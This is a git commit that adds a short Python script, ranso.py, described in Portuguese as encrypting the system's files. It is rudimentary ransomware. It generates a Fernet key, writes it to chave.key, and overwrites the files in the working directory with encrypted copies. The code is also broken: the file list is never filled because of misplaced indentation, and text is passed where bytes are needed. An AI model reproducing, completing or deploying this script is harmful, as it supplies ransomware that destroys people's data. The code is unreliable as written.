a6dd0bd25768dfbb418889998715dad511aaf732
Keidi Francis L15B04 <65850554+Keidi16@users.noreply.github.com>
2022-12-03 20:44:25 +0100

    Add files via upload
    Script em Python com finalidade de criptografar os arquivos do sistema.

---
+++ ranso.py
@@ -0,0 +1,21 @@
+import os
+from cryptography.fernet import Fernet
+
+
+files = []
+key = Fernet.generate_key()
+
+with open("chave.key",'wb') as chave:
+	chave.write(key)
+for file in os.listdir():
+	if file == 'ranso.py' or file =='chave':
+		continue
+		if os.path.isfile(file):
+			files.append(file)
+for file in files:
+	with open(file,'r') as arquivo:
+		conteudo = arquivo.read()
+		conteudo_encrypted = Fernet(key).encrypt(conteudo)
+		
+		with open(file,'wb') as arquivo:
+			arquivo.write(conteudo_encrypted)
